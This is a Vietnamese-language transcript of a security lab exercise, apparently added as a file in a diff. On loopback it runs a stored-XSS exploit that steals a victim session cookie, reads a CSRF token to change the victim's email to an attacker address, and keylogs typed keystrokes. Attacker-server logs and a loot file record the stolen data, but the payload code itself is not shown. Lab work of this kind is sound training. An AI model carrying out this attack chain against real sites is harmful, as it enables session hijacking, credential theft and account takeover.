@@ -1,0 +1,50 @@
+# Transcript lab 3.5 - Khai thac XSS day du (cookie + keylog + account takeover)
+# App co lo hong: 127.0.0.1:8036 | Server ke tan cong: 127.0.0.1:8037
+# Chay that, loopback. Ngay: 2026-10-18T10:27:22Z
+
+$ python3 exploit.py
+======================================================================
+[1] KE TAN CONG gui ticket chua payload XSS
+    payload da gui (xem bien PAYLOAD trong exploit.py)
+======================================================================
+[2] Kiem tra stored XSS trong /inbox
+    payload render nguyen van (chua escape)? : CO
+======================================================================
+[3] NAN NHAN dang nhap va mo /inbox (trinh duyet chay payload)
+    cookie nan nhan: session=victim-session-5e9d2a
+    email nan nhan TRUOC khi dinh XSS: support@corp.local
+    [mo phong trinh duyet nan nhan thuc thi payload]
+    a) exfil cookie -> attacker
+    b) doc CSRF token tu /account roi POST /change-email (doi email nan nhan)
+       CSRF token doc duoc: csrf-738901315038
+       POST /change-email -> HTTP 200 : OK doi email thanh attacker@evil.test
+    c) keylogger: nan nhan go 'p@ss', tung phim bay ve attacker
+======================================================================
+[4] Kiem chung ket qua
+    email nan nhan SAU khi dinh XSS: attacker@evil.test
+    du lieu server ke tan cong thu duoc (loot.txt):
+      [2026-10-18T10:27:22.952647Z] type=cookie    data=session=victim-session-5e9d2a
+      [2026-10-18T10:27:22.964380Z] type=takeover  data=email-changed
+      [2026-10-18T10:27:22.971191Z] type=key       data=p
+      [2026-10-18T10:27:22.975257Z] type=key       data=@
+      [2026-10-18T10:27:22.979317Z] type=key       data=s
+      [2026-10-18T10:27:22.983280Z] type=key       data=s
+======================================================================
+TONG KET: CHIEM TRON - trom cookie + keylog + doi email nan nhan thanh cong
+
+## Log phia server ke tan cong (attacker.py stdout)
+[attacker] lang nghe http://127.0.0.1:8037/log -> /mnt/d/REVERSE_IDA_DNSPY_JADX_PYCDC/TechWeb/labs/3.5/loot.txt
+[attacker] [2026-10-18T10:27:22.952647Z] type=cookie    data=session=victim-session-5e9d2a
+[attacker] [2026-10-18T10:27:22.964380Z] type=takeover  data=email-changed
+[attacker] [2026-10-18T10:27:22.971191Z] type=key       data=p
+[attacker] [2026-10-18T10:27:22.975257Z] type=key       data=@
+[attacker] [2026-10-18T10:27:22.979317Z] type=key       data=s
+[attacker] [2026-10-18T10:27:22.983280Z] type=key       data=s
+
+## File loot.txt (toan bo du lieu thu duoc)
+[2026-10-18T10:27:22.952647Z] type=cookie    data=session=victim-session-5e9d2a
+[2026-10-18T10:27:22.964380Z] type=takeover  data=email-changed
+[2026-10-18T10:27:22.971191Z] type=key       data=p
+[2026-10-18T10:27:22.975257Z] type=key       data=@
+[2026-10-18T10:27:22.979317Z] type=key       data=s
+[2026-10-18T10:27:22.983280Z] type=key       data=s
